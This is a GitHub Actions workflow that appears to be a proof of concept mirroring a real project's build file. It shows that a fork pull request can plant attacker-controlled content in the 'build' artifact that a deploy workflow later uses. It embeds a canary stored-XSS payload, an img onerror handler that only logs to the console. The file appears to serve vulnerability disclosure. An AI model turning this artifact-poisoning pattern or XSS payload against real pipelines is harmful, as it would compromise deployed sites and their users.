name: Build
# ---------------------------------------------------------------------------
# MINIMAL MIRROR of brave/leo .github/workflows/build.yml
# (real file: name "Build", trigger `on: pull_request`, uploads artifact `build`)
#
# Only the security-relevant shape is preserved:
#   * trigger includes `pull_request`  -> a FORK PR can produce this run
#   * artifact name is exactly `build` -> matches what the Deploy side downloads
#   * NO fork gate on the upload        -> a fork's content becomes the `build` artifact
#
# The heavy pnpm/nala build is replaced by a trivial step that emits a CANARY so
# the whole thing runs in ~15s on a stock ubuntu-latest runner. The canary carries
# a unique marker + a BENIGN stored-XSS probe (console.log only, no network).
# ---------------------------------------------------------------------------
on:
  pull_request:
  push:
    branches:
      - main
  workflow_dispatch:

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}

# real leo build.yml uses `contents: write`; a fork PR's GITHUB_TOKEN is read-only
# regardless, so the value is irrelevant to this PoC. Kept minimal.
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8e8c483db84b4bee98b60c0593521ed34d9990e8 # v6.0.1

      - name: Build (mock nala) — emit CANARY storybook-static
        run: |
          set -eEo pipefail
          mkdir -p ./storybook-static ./tokens/css
          # ---- attacker-controlled artifact content (this is what a fork PR edits) ----
          cat > ./storybook-static/index.html <<'HTML'
          <!doctype html>
          <html>
            <head><title>POC-CANARY nala mirror</title></head>
            <body>
              <h1>POC-CANARY-BRAVE-LEO-WFRUN-FORK-CONTROLLED-9b71</h1>
              <!-- benign stored-XSS canary: console.log only, no fetch/no network/no exfil -->
              <img src=x onerror="console.log('POC-CANARY-STORED-XSS-FORK-CONTROLLED-9b71')">
            </body>
          </html>
          HTML
          # mirror the two diff files the real build also uploads, so the artifact
          # tree matches brave/leo exactly (storybook-static/ + tokens/css/*.diff)
          echo "poc file-sizes diff canary" > ./tokens/css/file-sizes.diff
          echo "poc variables diff canary"  > ./tokens/css/variables.chromium.diff
          echo "==> wrote canary:"
          cat ./storybook-static/index.html

      # EXACT mirror of brave/leo build.yml:96-104 — name `build`, same path shape.
      - name: Upload Artifact
        uses: actions/upload-artifact@330a01c490aca151604b8cf639adc76d48f6c5d4 # v5.0.0
        with:
          name: build
          if-no-files-found: error
          path: |
            ./storybook-static
            ./tokens/css/variables*.diff
            ./tokens/css/file-sizes.diff
